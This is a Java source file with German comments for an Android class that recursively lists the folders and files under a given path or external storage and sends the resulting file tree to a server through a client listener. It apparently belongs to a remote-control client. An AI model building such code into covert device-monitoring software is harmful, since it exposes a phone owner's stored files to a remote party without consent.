package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.client.ClientListener;

import utils.MyFile;
import Packet.FileTreePacket;
import android.content.Context;
import android.os.Environment;
/**
 * Diese Klasse wird zum Abfragen der Ordnerstruktur des Clients verwendent.
 */
public class DirLister {
	/**
	 * Methode zum Erstellen eines FileTreePacket.
	 * @param c	Service der die Methode aufruft
	 * @param channel Kanal zur Datenübertragung
	 * @param dirname Verzeichnis ab welchem die Auflistung beginnen soll.
	 * @return false falls der Ordner nicht existiert, true sonst.
	 */
	public static boolean listDir(ClientListener c, int channel, String dirname) {
		/**
		 * f Von hier aus wir diesem Verzeichnis aus wird die Ordnerstruktur erstellt.
		 */
		File f;
		/**
		 * ar	In dieser Liste werden die Daten über die Ordner gepseichert.
		 */
		ArrayList<MyFile> ar = new ArrayList<MyFile>();
		/**
		 * Überprüfen ob das Startverzeichnis \ ist. Wenn dies nicht der Fall ist wird der erste externe Speicher als Verzeichniss verwendet.
		 */
		if(dirname.equals("/"))
			f = Environment.getExternalStorageDirectory();
		else
		/**
		 * Ansonsten einen neuen Ordner mit dem übergebenen Verzeichnis erstellen.
		 */
			f = new File(dirname);
		/**
		 * Sollte f nicht existieren, wird die Methode beendet.
		 */
		if (!f.exists()) {
			return false;
		} 
		else {
			/**
			 * Ansonsten wird die vistiAllDirsAndFiles Methode mit f als Argument aufgerufen und das Ergebnis in der ArrayList ar gespeichert.
			 */
			ar.add(visitAllDirsAndFiles(f));
			/**
			 * Neues FileTreePacket erstellen und die ArrayList übergeben.
			 * Das Paket wird danach an den Server gesendet.
			 * Zusätzlich wird true zurückgegeben.
			 */
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}

	/**
	 * Diese Methode geht von Startverzeichnis aus alles Kindordner durch.
	 * @param dir 	Der Start Konten
	 * @param ar	Die ArrayListe in der die Daten gespeichert werden.
	 */
	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {
		/**
		 * Überprüfen ob der Ordner existiert.
		 */
		if(dir.exists()) {
			/**
			 * Überprüfen ob es sich um eine Verzeichnis handelt.
			 */
		    if (dir.isDirectory()) {
				/**
				 * Mögliche Kinderordner des Verzeichnis im StringArray auflisten.
				 */
		        String[] children = dir.list();
				/**
				 * Den Ordner der ArrayList hinzufügen.
				 */
				ar.add(new MyFile(dir));
				/**
				 * Überprüfen ob die Kindordner wiederum Kindordner besitzen.
				 */
		        if(children != null) {
					/**
					 * For Schleife durch alle Unterordner
					 */
			        for (String child: children) {
			        	//System.out.println(dir.toString()+"/"+child);
			        	try {
							/**
							 * Erstellen eines neuen Files wobei der dir Ordnerpfad und child der Ordnername ist.
							 */
			        		File f = new File(dir, child);
							/**
							 * Rekursiver Aufruf der Methode vistiAllDirsAndFiles
							 */
			        		visitAllDirsAndFiles(f, ar);
			        	}
			        	catch(Exception e) {
			        		System.out.println("Child !"+child);
			        		e.printStackTrace();
			        	}
			        }
		        }
		    }
		    else
			/**
			 * Wenn dir kein Verzeichnis ist, nur die Datei dir der Liste ar hinzufügen.
			 */
		    	ar.add(new MyFile(dir));
		}
	}

	/**
	 * Diese Methode listet alle Ordner und Unterordner ab dem Order dir auf.
	 * @param dir	Wurzelordner
	 * @return der Ordner
	 */
	public static MyFile visitAllDirsAndFiles(File dir) {
		/**
		 * Überprüfen ob der Ordner dir existiert.
		 */
		if(dir.exists()) {
			/**
			 * Überprüfen ob dir ein Verzeichnis ist.
			 */
		    if (dir.isDirectory()) {
				/**
				 * Unterorder/Dateien von Dir auflisten und in children speichern.
				 */
		        String[] children = dir.list();
				/**
				 * Neuen Ordener für dir erstellen
				 */
		        MyFile myf = new MyFile(dir);
		        //ar.add(new MyFile(dir));
				/**
				 * Überprüfen ob es Kinder gibt.
				 */
		        if(children != null) {
					/**
					 * Überprüfen ob das Array eine Länge !=0 hat
					 */
		        	if(children.length != 0) {
						/**
						 * For-Schleife durch alle Elemente des Arrays children
						 */
				        for (String child: children) {
				        	//System.out.println(dir.toString()+"/"+child);
				        	try {
								/**
								 * Versuchen einen neuen Ordner mit dem Pfad dir und dem Namen Child zu erstellt.
								 */
				        		File f = new File(dir, child);
								/**
								 * Rekursiver Aufruf der Methode.
								 */
				        		myf.addChild(visitAllDirsAndFiles(f));
				        	}
				        	catch(Exception e) {
				        		System.out.println("Child !"+child);
				        		e.printStackTrace();
				        	}
				        }
		        	}
		        }
				/**
				 * myf zurückgeben
				 */
	        	return myf;
		    }
		    else
			/**
			 * Keine Unterordner daher wird nur der File dir zurückgegeben
			 */
		    	return new MyFile(dir);
		}
		/**
		 * Ordner existiert nicht daher wird null zurückgeliefert.
		 */
		return null;
	}
	
}
